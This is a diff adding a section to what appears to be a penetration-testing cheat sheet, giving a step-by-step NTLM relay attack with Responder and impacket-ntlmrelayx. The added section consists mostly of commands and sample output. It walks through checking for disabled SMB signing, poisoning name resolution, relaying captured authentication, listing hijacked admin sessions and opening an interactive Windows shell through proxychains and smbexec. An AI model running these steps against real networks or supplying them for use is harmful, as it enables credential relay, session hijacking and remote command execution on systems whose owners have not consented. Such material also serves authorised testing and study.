@@ -166,3 +166,58 @@ Also for help use either the autocompletion of the tool (`tab` is your friend) o
 > help arp.spoof
 ```
 
+
+### Responder and ntlmrelayx
+
+> Aim for this attack is to poison the victim so their connections are forwarded over the attacker station and relayed to the initial destination of an `smb` connection for example.
+
+In order to intercept the connection and hijack it later on, we need connection attemps from the client which are successfull against a target.
+
+0. Prerequisites:
+
+- `SMB signing` has to be off!
+
+```bash
+python /usr/share/responder/tools/RunFinger.py -i <targetIP>  # see below
+[SMB2]:['10.0.10.4', Os:'Windows 7/Server 2008R2', Build:'7601', Domain:'DUMMY-PC', Bootime: '2023-01-20 08:27:47', Signing:'False', RDP:'False', SMB1:'True', MSSQL:'False']
+```
+
+1. Start `impacket-ntlmrelayx` in order to forward the requests to the target destination
+
+```bash
+# Terminal 1
+impacket-ntlmrelayx -socks -smb2support -tf <fileWithSMBshareIPs> --output-file <file2save> # or -t <targetIP> instead of -tf
+```
+
+2. Start `responder` and poison the victim so it sends the request to the attacker
+
+```bash
+# configure responder
+sudo nano /etc/responder/Responder.conf
+> SMB = Off
+> HTTP = Off
+```
+
+```bash
+# Terminal 2
+sudo responder -I <interface> -wd
+```
+
+3. Check in the cli of `impacket-ntlmrelayx` if sessions have been hijacked
+
+```bash
+# Terminal 1
+> socks
+> Protocol Target Username AdminStatus Port
+> -------- ------------- ----------------- ----------- ----
+> SMB 172.16.23.101 ELS-CHILD/DMANUEL TRUE 445  # usable sessions
+> SMB 172.16.23.103 <domain>/<user> FALSE 445 # unusable
+```
+
+4. "connect" to the hijacked sessions via socks proxy provided by `impacket-ntlmrelayx`
+
+```bash
+proxychains -q impacket-smbexec <domain>/<user>:<rndPW>@172.16.23.101  # pw can be left empty
+```
+
+5. An interactive sessions to the windows shell should be open now
